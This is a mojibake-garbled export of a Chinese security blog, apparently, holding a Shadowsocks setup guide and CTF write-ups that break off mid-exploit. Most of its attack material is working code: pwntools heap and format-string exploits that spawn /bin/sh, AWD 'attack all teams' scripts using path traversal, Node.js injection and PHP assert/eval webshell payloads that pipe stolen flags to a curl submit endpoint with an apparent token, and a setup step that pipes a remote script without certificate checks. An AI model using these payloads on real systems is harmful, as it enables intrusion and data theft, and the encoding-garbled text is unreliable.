‹è‡ªå·±æ­å°é£æœºçš„è¿‡ç¨‹ã€‚","text":"è®°å½•ä¸€ä¸‹è‡ªå·±æ­å°é£æœºçš„è¿‡ç¨‹ã€‚ ç¬¬ä¸€æ­¥-ç§ŸæœåŠ¡å™¨å…ˆæ”¾ä¸€äº›å›½å¤–çš„ä¸€äº›VPSæä¾›å•†ï¼švultrã€linodeã€æ¬ç“¦å·¥ã€‚æˆ‘æ˜¯åœ¨vulträ¸Šç§Ÿçš„æœåŠ¡å™¨ã€‚ é¦–å…ˆæ³¨å†Œè´¦å·ï¼Œè¿›å…¥\bä¸ªäººç•Œé¢åï¼Œåœ¨Billingé¡µé¢ä½¿ç”¨Alipayå……å€¼ã€‚ å»Serversé¡µé¢ï¼Œ\bé€‰æ‹©æœåŠ¡å™¨çš„åœ°ç‚¹ï¼Œæˆ‘é€‰äº†Los Angelesã€‚ ç„¶åé€‰æ‹©osï¼Œæˆ‘çš„è¯é€‰äº†CentOSã€‚ ç„¶åSizeæˆ‘æ˜¯é€‰äº†$3.5/moï¼Œå› ä¸ºæœ€ä¾¿å®œçš„$2.5/moåªæ”¯æŒipv6ã€‚ ç„¶åç‚¹å‡»Deploy Nowï¼Œè¿‡ä¸€ä¼šå„¿å°±å¯ä»¥å¾—åˆ°è¿™å°æœåŠ¡å™¨çš„åŸºæœ¬ä¿¡æ¯ã€‚ ç¬¬äºŒæ­¥-sshè¿œç¨‹è¿æ¥macçš„è¯æˆ‘æ˜¯ç”¨çš„SSH Shellæ¥è¿ï¼Œå¦‚æœæ˜¯windowså¯ä»¥ç”¨Puttyã€‚ æŒ‰ç…§ç»™å‡ºçš„ä¿¡æ¯è¿ä¸€ä¸‹å°±è¡Œäº†ï¼ˆ\bç«¯å£22ï¼‰ã€‚ ç¬¬ä¸‰æ­¥-æ­å»º\båœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼š 123wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.shchmod +x shadowsocks-all.sh./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log ç„¶åæŒ‰ç…§æç¤ºé€‰æ‹©è„šæœ¬ï¼Œæˆ‘é€‰äº†Shadowsocks-Goï¼Œä¹‹å\bä¹Ÿæ˜¯æ— è„‘è·Ÿç€æŒ‡ä»¤ä¸€æ­¥ä¸€æ­¥è¿›è¡Œï¼Œå®‰è£…å®Œæˆåå°±ä¼šå¾—åˆ°\bï¼š 12345678910111213141516Starting shadowsocks-go (via systemctl): [ OK ]Congratulations, Shadowsocks-Go server install completed!Your Server IP : xxx.xxx.xxx.xxxYour Server Port : xxxxxYour Password : xxxxxxxxxxx Your Encryption Method: xxxxxxxxxxxYour QR Code: (For Shadowsocks Windows, OSX, Android and iOS clients) ss://YWVzLTI1Ni1jZmI6dGVkZHlzdW4uY29tQDE0OS4yNDguNC4yMjg6MTIyOTk=Your QR Code has been saved as a PNG file path: /root/shadowsocks_go_qr.pngWelcome to visit: https://teddysun.com/486.htmlEnjoy it! ç¬¬å››æ­¥-ç§‘å­¦ä¸Šç½‘æˆ‘æŠŠ\bæ¯ä¸ªå¹³å°ä¸Šçš„å°é£æœºéƒ½æ”¾åœ¨æˆ‘çš„githubä¸Šäº†ã€‚\båªè¦å°†ä¸Šé¢çš„ä¿¡æ¯å¡«è¿›å»å°±èƒ½ç§‘å­¦ä¸Šç½‘å•¦ã€‚ å‚è€ƒç½‘ç«™https://www.diycode.cc/topics/738","categories":[],"tags":[{"name":"note","slug":"note","permalink":"https://qianfei11.github.io/tags/note/"}]},{"title":"2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review","slug":"ã€æœªå®Œæˆã€‘2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review","date":"2018-08-31T14:34:15.000Z","updated":"2019-01-22T12:50:55.071Z","comments":true,"path":"2018/08/31/ã€æœªå®Œæˆã€‘2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/","link":"","permalink":"https://qianfei11.github.io/2018/08/31/ã€æœªå®Œæˆã€‘2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/","excerpt":"æ”¾æš‘å‡ç©äº†å‡ å¤©ï¼Œæ…¢æ…¢æ•´ç†è¿™å‡ æ¬¡æ¯”èµ›ã€‚","text":"æ”¾æš‘å‡ç©äº†å‡ å¤©ï¼Œæ…¢æ…¢æ•´ç†è¿™å‡ æ¬¡æ¯”èµ›ã€‚ CRYPTO-çˆ¬å¡é“æç¤ºæ˜æ˜¾æ˜¯å¸Œå°”åŠ å¯†ï¼Œäº†è§£ä¸€ä¸‹å¸Œå°”åŠ å¯†å†™ä¸€ä¸‹è„šæœ¬æˆ–è€…åœ¨çº¿è§£å¯†ã€‚ 123456789101112131415161718192021from numpy import *flag = ''mat_key = mat([[3, 1], [2, 1]])enc = 'mttpjbpexfdzcegtdzeanutg'# pla = 'thehillisveryinteresting'# å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—enc1 = []for i in range(len(enc)): enc1.append(ord(enc[i]) - ord('a'))# è®¡ç®—æ˜æ–‡å¹¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²res = mat_enc * mat_key.Ires = res.reshape(1, len(enc1)).tolist()[0]flag = ''for i in range(len(res)): flag += chr(ord('a') + (int(round(res[i])) % 26))# è¾“å‡ºflagprint flag æœ€åæäº¤flagçš„md5å€¼ã€‚ RE-Dig The Wayé¢˜ç›®é‡Œç›´æ¥ç»™äº†ä¸€ä¸ªidbæ–‡ä»¶ï¼Œç”¨idaæ‰“å¼€åˆ†æã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax int result; // eax int v5; // eax char flag; // [esp+11h] [ebp-3Fh] int a[0]; // [esp+28h] [ebp-28h] int a[2]; // [esp+30h] [ebp-20h] int a[4]; // [esp+38h] [ebp-18h] int a[5]; // [esp+3Ch] [ebp-14h] signed int (__cdecl *_func0)(char *, int, int); // [esp+40h] [ebp-10h] int (__cdecl *_func1)(char *, int, int); // [esp+44h] [ebp-Ch] int (__cdecl *_func2)(char *, int, int); // [esp+48h] [ebp-8h] int i; // [esp+4Ch] [ebp-4h] __main(); _func0 = swap; // swap pos _func1 = trans1; // |x + y| - |x| - |y| + 2 _func2 = trans2; // |x| + |y| - |x + y| + 2 v3 = 0; do &#123; *(int *)((char *)&amp;a[0] + v3) = 0; // init array v3 += 4; &#125; while ( v3 &lt; 24 ); printf(\"input flag:\"); scanf(\"%s\", &amp;flag); if ( strcmp(&amp;flag, \"flag&#123;\") &lt; 0 ) // 1.flag head return 0; if ( check(&amp;flag) ) // 2.flag all-misc &#123; a[5] = getValue(&amp;flag); if ( a[5] &gt; 0 ) // make sure only one solution &#123; for ( i = 0; i &lt;= 2; ++i ) &#123; v5 = (*(&amp;_func0 + i))((char *)&amp;a[0], 4, 5); *(&amp;a[0] + i) = v5; a[5] = -a[4]; &#125; if ( a[2] ) // 3.flag key-point &#123; result = 1; &#125; else &#123; puts(\"Congratulations\"); system(\"PAUSE\"); result = 0; &#125; &#125; else &#123; result = 0; &#125; &#125; else &#123; puts(\"check your flag!\"); result = 0; &#125; return result;&#125; ä¸€å¼€å§‹å¯¹è¾“å…¥å­—ç¬¦ä¸²åŒ¹é…äº†flag{ï¼Œä¹‹åæœ‰å¤šä¸ªå‡½æ•°è¿›è¡Œçš„è½¬æ¢ã€‚å¯ä»¥çœ‹å‡ºæœ€é‡è¦çš„æœ‰ä¸‰ä¸ªå‡½æ•°ï¼š check() getValue() _func2 ä¸‹é¢å°±é€ä¸€åˆ†æã€‚ check()1234567891011121314bool __cdecl check(_BYTE *a1)&#123; if ( (char)a1[7] + (char)a1[6] != (char)a1[8] ) return 0; if ( (char)a1[10] + (char)a1[9] != (char)a1[11] ) return 0; if ( (char)a1[13] + (char)a1[12] != (char)a1[14] ) return 0; if ( (char)a1[16] + (char)a1[15] != (char)a1[17] ) return 0; if ( (char)a1[19] + (char)a1[18] == (char)a1[20] ) return (a1[8] ^ (unsigned __int8)(a1[11] ^ a1[14] ^ a1[17] ^ a1[21])) == a1[5]; return 0;&#125; é€šè¿‡è¿™ä¸ªå‡½æ•°å¤§æ¦‚å¯ä»¥å¾—åˆ°å‡ ä¸ªå­—ç¬¦å¾—åˆ°çš„æ–¹å¼ï¼Œæ˜¾ç„¶è¿™é‡Œç”¨z3æ˜¯å¾ˆéš¾æ±‚è§£çš„ã€‚ getValue()12345678910int __cdecl getValue(char *a1)&#123; signed int i; // [esp+8h] [ebp-8h] int v3; // [esp+Ch] [ebp-4h] v3 = 0; for ( i = 6; i &lt;= 19; i += 3 ) v3 = 100 * v3 + 10 * (a1[i] - 48) + a1[i + 1] - 48; return v3;&#125; ä»ç¬¬å…­ä½å¼€å§‹ï¼Œæ¯æ¬¡å–ä¸‰ä½ï¼Œæ¯ä¸‰ä½å–å‰ä¸¤ä½ç»„æˆæ•°å­—v3å¹¶è¿”å›ã€‚ _func21234567int __cdecl trans2(char *a1, int i, int j)&#123; return abs(*(_DWORD *)&amp;a1[4 * j]) - abs(*(_DWORD *)&amp;a1[4 * j] + *(_DWORD *)&amp;a1[4 * i]) + abs(*(_DWORD *)&amp;a1[4 * i]) + 2;&#125; ç®€åŒ–ä¸º|x| + |y| - |x + y| + 2ï¼Œæ ¹æ®mainå‡½æ•°ä¸­çš„é€»è¾‘ï¼Œè¯¥å€¼åº”è¯¥ä¸º0ã€‚ä½†åˆå› ä¸º|x| + |y| &gt;= |x + y|ï¼Œæ•…|x| + |y| - |x + y| + 2 &gt; 0ï¼Œæ— æ³•ä½¿ä¹‹ä¸º0ã€‚ ä¸‹é¢å¼€å§‹å¯¹ç¨‹åºé€†å‘åˆ†æï¼š ç”±äºç¬¬ä¸‰ä¸ªå‡½æ•°å¾ˆéš¾å¾—åˆ°0ï¼Œå¯ä»¥æƒ³åˆ°æº¢å‡ºæ–¹é¢ï¼Œä½¿è¿”å›å€¼ä¸º0x100000000ã€‚xä¸yçš„å€¼åˆå› ä¸ºäº’ä¸ºç›¸åæ•°ï¼Œå¯ä»¥æ±‚å‡º|x|å’Œ|y|çš„å€¼ï¼Œè€Œyåœ¨å†…å­˜ä¸­çš„è¡¨ç¤ºå³ä¸ºxçš„è¡¥ç ã€‚å¾—åˆ°xä¸º2147483647ï¼Œyä¸º2147483649ã€‚ é€šè¿‡xçš„å€¼å’ŒgetValueå‡½æ•°å€’æ¨å‡ºä¸€éƒ¨åˆ†flagï¼šflag{x21x47x48x36x47ï¼ˆxä¸ºæœªçŸ¥éƒ¨åˆ†ï¼‰ã€‚ æ ¹æ®checkå‡½æ•°ï¼Œå†™ä¸ªè„šæœ¬è·‘å‡ºå¤§éƒ¨åˆ†flagï¼šflag{x21c47k48l36i47kã€‚ æœ€åè¿˜æœ‰ä¸€éƒ¨åˆ†ç”±äºä¸çŸ¥é“ç¬¬21ä½flagï¼ŒçŒœæµ‹åº”è¯¥æ˜¯}äº†ï¼Œé€šè¿‡checkå‡½æ•°å¼‚æˆ–åå¾—åˆ°ï¼šflag{p21c47k48l36i47k} MISC-æš´åŠ›å¯è§£8ä½çš„æ•°å­—æš´åŠ›ç ´è§£å¾—åˆ°zipå¯†ç ã€‚ å…ˆè¯•ç€ç”¨stegsolveæŠŠä¸¤å¼ å›¾åˆå¹¶æ— æœï¼ŒçŒœæµ‹æ˜¯ç›²æ°´å°ï¼Œç”¨å·¥å…·BlindWaterMarkï¼Œå‘½ä»¤ä¸ºpython bwm.py 1.png 2.png flag.pngï¼Œæœ€åå¾—åˆ°flagã€‚ PWN-Unote2åˆæ­¥åˆ¤æ–­é¢˜ç›®åº”è¯¥æ˜¯å’Œå †ç›¸å…³ï¼Œæ‰“å¼€idbæ–‡ä»¶ã€‚ å‘ç°åœ¨deleteå‡½æ•°å¤„freeæ‰æŒ‡é’ˆåæ²¡æœ‰æƒ…å†µï¼Œäº§ç”Ÿäº†uafï¼ˆuse after freeï¼‰ï¼š 123456if ( ptr[v1] ) // uaf&#123; free(*((void **)ptr[v1] + 1)); free(ptr[v1]); puts(\"Success\");&#125; addå‡½æ•°ç”³è¯·ä¸€ä¸ª8byteå¤§å°çš„ç»“æ„ä½“ï¼Œå­˜æ”¾å‡½æ•°æŒ‡é’ˆå’Œnoteçš„å†…å®¹ï¼Œå‡½æ•°æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªæ‰“å°å‡½æ•°ï¼š 12345678int __cdecl print_string(char *s)&#123; size_t v1; // eax v1 = strlen(s); printf(\"length :%zu\\ncontent :\", v1); return puts(s);&#125; \bå€Ÿé‰´ä¸€å¶é£˜é›¶å¸ˆå‚…çš„expå¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *context.log_level = 'debug'context.arch = 'i386'local = 1if local: p = process('./note') elf = ELF('./note') libc = ELF('/home/assassinq/Desktop/pwn/heap/AHB-note/libc-2.23.so')else: p = remote('101.71.29.5', 10001) elf = ELF('./note') libc = ELF('/home/assassinq/Desktop/pwn/heap/AHB-note/libc-2.23.so')def d(a=''): gdb.attach(p, a) if a == '': raw_input()def add(size, con): p.sendline('1') p.recvuntil('Note size :') p.send(str(size)) p.recvuntil('Content :') p.send(con)def dele(idx): p.sendline('2') p.recvuntil(\"Index :\") p.send(str(idx))def show(idx): p.send('3') p.recvuntil(\"Index :\") p.send(str(idx))add(0x20, 'A')add(0x20, 'B')add(0x20, 'C')dele(1)dele(0)# d('b *0x08048691\\nc')add(0x8, p32(0x804865B) + p32(elf.got['puts']))show(1)p.recvuntil(\"content :\")leak = p.recv(4)libc.address = u32(leak) - libc.symbols['puts']log.info(\"libc_base:0x%x\" % libc.address)dele(3)add(0x8, p32(libc.symbols['system']) + p32(libc.search('/bin/sh').next()))show(1)p.interactive() å…ˆç”³è¯·ä¸‰ä¸ªnoteï¼Œmallocäº†6\bä¸ªchunkï¼š 123&apos;A&apos; 0x10 byte + size + 0x10 byte&apos;B&apos; 0x10 byte + size + 0x10 byte&apos;C&apos; 0x10 byte + size + 0x10 byte å†freeæ‰ä¸¤ä¸ªnoteï¼š 1head --&gt; &apos;A&apos; 0x10 --&gt; &apos;B&apos; 0x10 ç„¶åå†ç”³è¯·ä¸€ä¸ªnoteï¼Œä¹Ÿå°±æ˜¯æŠŠä¹‹å‰å·²ç»freeäº†çš„chunké‡æ–°åˆ†é…å›æ¥äº†ï¼Œå¯ä»¥leakå‡ºlibcåœ°å€ã€‚æœ€åå†ä¼ªé€ ä¸€ä¸ªfake noteï¼Œ\bshowçš„æ—¶å€™å°±è°ƒç”¨äº†systemï¼ŒæˆåŠŸgetshellã€‚ æµé‡åˆ†æç›¸å¯¹ç³»ç»Ÿåœ°å­¦ä¹ äº†ä¸€ä¸‹wiresharkçš„ä½¿ç”¨å’Œæµé‡åˆ†æã€‚ å‰ç½®çŸ¥è¯† è¿‡æ»¤IPï¼š ip.src eq x.x.x.x or ip.dst eq x.x.x.x ip.addr eq x.x.x.x è¿‡æ»¤ç«¯å£ï¼š tcp.port eq 80 or udp.port eq 80 è¿‡æ»¤MAC eth.dst == A0:00:00:04:C5:84 httpæ¨¡å¼è¿‡æ»¤ï¼š http.request.method == &quot;GET&quot; http.request.method == &quot;POST&quot; http.request.uri == &quot;/img/logo-edu.gif&quot; http contains &quot;GET&quot; http contains &quot;HTTP/1.&quot; http.request.method == &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot; webone.pcapåè®®åˆ†çº§å‘ç°å¤§éƒ¨åˆ†ä¸ºhttpï¼Œé‡ç‚¹å…³æ³¨å¯¹è¯çš„80ç«¯å£ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šé»‘å®¢çš„åœ°å€ã€‚ é»‘å®¢ä½¿ç”¨çš„æ‰«æå™¨ æ‰«æå™¨å¾ˆå®¹æ˜“å‘ç°ï¼š æˆ–è€…å¯ä»¥ç”¨http containsæŸ¥æ‰¾å¸¸ç”¨çš„å‡ ç§æ‰«æå™¨ã€‚ é»‘å®¢æ‰«æåˆ°çš„ç™»é™†åå° 1http.request.method == &quot;POST&quot; å¾—çŸ¥é»‘å®¢ä½¿ç”¨äº†awvsåå†æ¬¡ç­›é€‰å¯ä»¥æ‰¾åˆ°ç™»å½•åå°ï¼š é»‘å®¢ç™»é™†webåå°ä½¿ç”¨çš„è´¦å·å¯†ç  1http.request.method == &quot;POST&quot; and ip.src == 192.168.94.59 and http contains &quot;rec=login&quot; é»‘å®¢ä¸Šä¼ çš„webshellå†…å®¹çš„baseç¼–ç  1http.request.method == &quot;POST&quot; and ip.src == 192.168.94.59 and http contains &quot;eval&quot; å³å°†@eval($_POST[&#39;1234&#39;])base64åŠ å¯†åæäº¤ã€‚ é»‘å®¢åœ¨robots.txtä¸­æ‰¾åˆ°çš„flag 1http contains &quot;Disallow&quot; é»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç  1http contains &quot;web&quot; and http contains &quot;password&quot; è¢«é»‘å®¢æ”»å‡»çš„webæœåŠ¡å™¨ç½‘å¡å†…ç½‘ip 1http contains &quot;eth&quot; webtwo.pcap é»‘å®¢åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°çš„hash_code 1mysql contains &quot;hash_code&quot; é»‘å®¢ç ´è§£è´¦å·ijnu@test.comå¾—åˆ°çš„å¯†ç  1mysql contains &quot;ijnu@test.com&quot; æ‰¾åˆ°å¯†ç åmd5è§£å¯†ï¼š mailtwo.pcap &amp;&amp; mailtwo1.pcap é»‘å®¢ç™»é™†mailç³»ç»Ÿä½¿ç”¨çš„è´¦å· å¯ä»¥ç¤¾å·¥ï¼Œç›´æ¥ç”¨webçš„è´¦å·å¯†ç ã€‚ æ­£ç»åšæ³•æ˜¯å…ˆåœ¨mailtwo.pcapä¸­æ‰¾åˆ°åŠ å¯†ç®—æ³•ï¼š 1234var key_hash = CryptoJS.MD5('1234567812345678');var key = CryptoJS.enc.Utf8.parse(key_hash);var iv = CryptoJS.enc.Utf8.parse('1234567812345678');form.password.value = CryptoJS.AES.encrypt(form.password.value, key, &#123; iv: iv,mode:CryptoJS.mode.CBC,padding:CryptoJS.pad.ZeroPadding&#125;) åœ¨mailtwo1.pcapä¸­å†è¿‡æ»¤ï¼š 1(http contains &quot;&#123;\\&quot;success\\&quot;:true&#125;&quot; or http.request.method == &quot;POST&quot;) and ip.addr == 192.168.94.59 æ‰¾åˆ°è¢«åŠ å¯†çš„å¯†ç ï¼š æœ€åæ ¹æ®ç®—æ³•å’Œå·²è¢«åŠ å¯†çš„å¯†ç å¾—åˆ°æ˜æ–‡å¯†ç ã€‚ vpnone.pcap &amp;&amp; vpntwo.pcapvpnone.pcapåœ¨å°è¯•ç™»é™†vpnï¼Œvpntwo.pcapæˆåŠŸç™»é™†äº†vpnã€‚ é»‘å®¢è·å¾—çš„vpnã€ip åœ¨ç»Ÿè®¡-&gt;ç«¯ç‚¹ä¸­æµé‡æœ€å¤§çš„ä¸ºé»‘å®¢ipã€‚ å‚è€ƒç½‘ç«™ï¼š http://foreversong.cn/archives/216http://skysec.top/2018/08/25/2018%E5%AE%89%E6%81%928%E6%9C%88%E8%B5%9BWriteup/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"2018-XManç»“è¥èµ›-review","slug":"2018-XManç»“è¥èµ›-review","date":"2018-08-22T09:39:54.000Z","updated":"2019-02-24T13:38:35.830Z","comments":true,"path":"2018/08/22/2018-XManç»“è¥èµ›-review/","link":"","permalink":"https://qianfei11.github.io/2018/08/22/2018-XManç»“è¥èµ›-review/","excerpt":"è®°å½•ä¸€ä¸‹è¢«è™çš„ç»å†ã€‚","text":"è®°å½•ä¸€ä¸‹è¢«è™çš„ç»å†ã€‚ å…¨é˜Ÿå°±æˆ‘ä¸€ä¸ªèœé¸¡ç»´æŠ¤äºŒè¿›åˆ¶ï¼Œå…¨åœºè¢«ç—›æ‰“ï¼Œå¾ˆéš¾å—ã€‚è®°å½•ä¸€ä¸‹çº¿ä¸‹AWDæ‰€éœ€è¦åšçš„å‡†å¤‡ï¼Œä»¥åŠä¸¤é“pwnçš„å¤ç°ã€‚ å‡†å¤‡ç¬¬ä¸€æ¬¡æ‰“AWDï¼Œä»€ä¹ˆä¹Ÿä¸æ‡‚ã€‚ æ¯”èµ›å‰äº†è§£æ¯”èµ›èµ›åˆ¶ã€ç¯å¢ƒã€‚ æœåŠ¡å™¨ä¸Šçº¿ä¹‹åï¼Œç¬¬ä¸€æ—¶é—´æ”¹å¯†ç ã€‚ ä¸‹è½½å¥½FileZillaã€Xshellç­‰è¿æ¥æœåŠ¡å™¨çš„å·¥å…·ï¼ŒæŠŠæœåŠ¡å™¨ä¸Šç»™çš„æ–‡ä»¶å¤‡ä»½ã€‚ æå‰å‡†å¤‡å¥½è‡ªåŠ¨åŒ–çš„è„šæœ¬ã€‚ è¿™é‡Œæ”¾ä¸€ä¸‹é˜Ÿå‹webå¤§ä½¬çš„æ‰“å…¨åœºè„šæœ¬ï¼š 12345678910111213141516171819202122232425from requests import getfrom os import systemfor i in range(24): if i == 12: continue print(f\"======&#123;i+1&#125; starts=======\") url = f\"http://172.16.&#123;i+1&#125;.101:20001/uploads/images/../../../../../../../flag\" try: flag = get(url).text[:-1] system(f'curl http://172.16.200.20:9000/submit_flag/ -d \"flag=&#123;flag&#125;&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD\"') print(f\"\\n&#123;flag&#125;\") except: print(f\"&#123;i+1&#125; : no\") pass url = f\"http://172.16.&#123;i+1&#125;.101:20001/category/test?0=%28function%28%29%7b%0a%20%20%20%20var%20fs%20%3d%20require%28%27fs%27%29%3b%0a%09var%20flag%20%3d%20fs.readFileSync%28%27%2fflag%27%2c%20%27utf-8%27%29%3b%0a%09fs.writeFileSync%28%27%2fhome%2fxctf%2fweb%2fstatic%2fjs%2ftest.js%27%2c%20flag%29%3b%0a%09return%201%3b%0a%7d%29%28%29%3b\" try: get(url) url = f\"http://172.16.&#123;i+1&#125;.101:20001/static/js/test.js\" flag = get(url).text flag = get(url).text[:-1] system(f'curl http://172.16.200.20:9000/submit_flag/ -d \"flag=&#123;flag&#125;&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD\"') print(f\"\\n&#123;flag&#125;\") except: pass 1234567891011121314151617181920212223242526272829303132from requests import postfrom pyquery import PyQuery as pqfrom os import systemfor i in range(24): if i == 8: continue print(f\"======&#123;i+1&#125; starts=======\") if i == 12 or i == 2: continue payloads = [ \"@assert($_POST[cmd])\", \"@assert($_POST[cmd])\", \"@call_user_func(assert, $_POST[cmd])\", \"print(file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103)))\" ] for p in payloads: url = \"http://172.16.\" + str(i+1) + \".102:20002/?r=list&amp;pages=123&#123;$&#123;\" + p + \"&#125;&#125;123\" t = post(url, data=&#123;'cmd' : 'system(\"/bin/cat /flag\");'&#125;).text try: d = pq(t) out = d('.pagecode').html() print(out) flag = out.split(';')[-2].split('\\n')[1] if i==16: flag = flag[2:] print(f\"&#123;i+1&#125; : &#123;flag&#125;\") system(f'curl http://172.16.200.20:9000/submit_flag/ -d \"flag=&#123;flag&#125;&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD\"') print('\\n') except: print(f\"&#123;i+1&#125; not avai\") pass å¤ç°å…¨åœºè´¡çŒ®åªæœ‰æˆåŠŸpatchäº†æœ€å®¹æ˜“çš„ç¬¬äºŒé¢˜ã€‚ once_timechecksecï¼š 123456[*] '/home/assassinq/Desktop/once_time' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) æ‹–è¿›idaï¼Œmainå‡½æ•°ï¼š 123456789101112131415unsigned __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char s; // [rsp+0h] [rbp-20h] char v5; // [rsp+8h] [rbp-18h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); setbuf(); printf(\"input your name: \", a2); memset(&amp;s, 0, 9uLL); read(0, &amp;s, 9uLL); v5 = 0; printf(\"wellcome :%s\\n\", &amp;s); return vul();&#125; å¦ä¸€ä¸ªå…³é”®å‡½æ•°ï¼š 1234567891011121314151617unsigned __int64 vul()&#123; char s; // [rsp+0h] [rbp-20h] unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); printf(\"leave a msg: \"); memset(&amp;s, 0, 0x10uLL); read(0, &amp;s, 0x20uLL); if ( strstr(&amp;s, \"%p\") || strstr(&amp;s, \"$p\") ) &#123; puts(\"do you want to leak info?\"); exit(0); &#125; printf(&amp;s, \"$p\"); return __readfsqword(0x28u) ^ v2;&#125; vul()ä¸­read(0, &amp;s, 0x20uLL);å¤„å­˜åœ¨buffer overflowï¼Œåˆå› ä¸ºå¼€äº†Canaryï¼Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡ï¼›printf(&amp;s, &quot;$p&quot;);å¤„å­˜åœ¨format stringï¼Œå¯ä»¥å®ç°ä»»æ„åœ°å€çš„è¯»å’Œå†™ã€‚ é¦–å…ˆå°†__stack_chk_failçš„gotè¡¨æ”¹æˆmainå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆè¿™æ ·æ¯æ¬¡æ ˆæº¢å‡ºæŠ¥é”™çš„æ—¶å€™å°±ä¼šå†ä¸€æ¬¡æ‰§è¡Œmainå‡½æ•°ï¼Œä»è€Œå®ç°å¤šæ¬¡è¾“å…¥ï¼Œå¯ä»¥å¤šæ¬¡åˆ©ç”¨printf(&amp;sï¼Œ&quot;$p&quot;);è¿›è¡Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ”»å‡»ï¼› æ³„æ¼libcçš„åŸºå€ï¼Œè¿™é‡Œç”¨æ³„æ¼readå‡½æ•°çš„çœŸå®åœ°å€æ¥å®ç°ï¼› å°†one_gadgetå†™å…¥exit()å‡½æ•°çš„gotè¡¨ä¸­ã€‚ 12345670008| 0x7fffffffdc10 (&quot;BBBBBBBB\\n&quot;) ; ç¬¬äºŒæ¬¡è¾“å…¥0016| 0x7fffffffdc18 --&gt; 0xa (&apos;\\n&apos;)0024| 0x7fffffffdc20 --&gt; 0x0 0032| 0x7fffffffdc28 --&gt; 0x8e2d258951a85400 0040| 0x7fffffffdc30 --&gt; 0x7fffffffdc60 --&gt; 0x400a20 (push r15)0048| 0x7fffffffdc38 --&gt; 0x400a08 (mov rcx,QWORD PTR [rbp-0x8])0056| 0x7fffffffdc40 (&quot;AAAAAAAA&quot;) ; ç¬¬ä¸€æ¬¡è¾“å…¥ è°ƒè¯•å‡ºæ¥å¯ä»¥çœ‹åˆ°ç¬¬ä¸€æ¬¡è¾“å…¥ä½äºç¬¬äºŒæ¬¡è¾“å…¥åçš„ç¬¬å…­ä¸ªå‚æ•°ï¼Œ64ä½ä¸‹åç§»å°±æ˜¯12ã€‚ä¸ºäº†è¾¾åˆ°è§¦å‘__stack_chk_failçš„ç›®çš„ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¦†ç›–æ‰Canaryï¼Œä½äºç¬¬äºŒæ¬¡è¾“å…¥åçš„ç¬¬ä¸‰ä¸ªå‚æ•°å¤„ï¼Œæ•…è‡³å°‘éœ€è¦è¾“å…¥å¤§äº24ä¸ªå­—ç¬¦ã€‚readæ€»å…±è¯»0x20ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬è¿™é‡Œä¹Ÿå°±è¯»0x20ä¸ªï¼Œä»¥è§¦å‘__stack_chk_failã€‚ ç¬¬äºŒæ­¥åˆ©ç”¨readçš„gotè¡¨å°†libcåŸºå€æ³„æ¼å‡ºæ¥ã€‚ç„¶ååœ¨å·²çŸ¥libcç‰ˆæœ¬çš„æƒ…å†µä¸‹ï¼Œç¬¬ä¸‰æ­¥å°†exitçš„gotè¡¨è¦†ç›–æˆone_gadgetã€‚æœ€åé€ä¸ª%pæˆ–è€…$pä¸Šå»getshellã€‚expå¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#!/usr/bin/env python#coding=utf-8from pwn import *# context.log_level = 'debug'context.arch = 'amd64'p = process('./once_time')elf = ELF('./once_time')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')one_gadget_offset = 0xf1147info('&gt;&gt;&gt; REPLACE __stack_chk_fail WITH main &lt;&lt;&lt;')main = 0x400983stack_chk_fail_got = elf.got['__stack_chk_fail']p.recvuntil('input your name: ')p.sendline(p64(stack_chk_fail_got))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$n'.format(str(main))payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;')read_got = elf.got['read']p.recvuntil('input your name: ')p.sendline(p64(read_got))p.recvuntil('leave a msg: ')payload = '%12$s'payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)data = p.recvuntil('\\x7f')print u64(data[-6:].ljust(8, '\\x00'))read_offset = libc.symbols['read']libc_base = u64(data[:6].ljust(8, '\\x00')) - 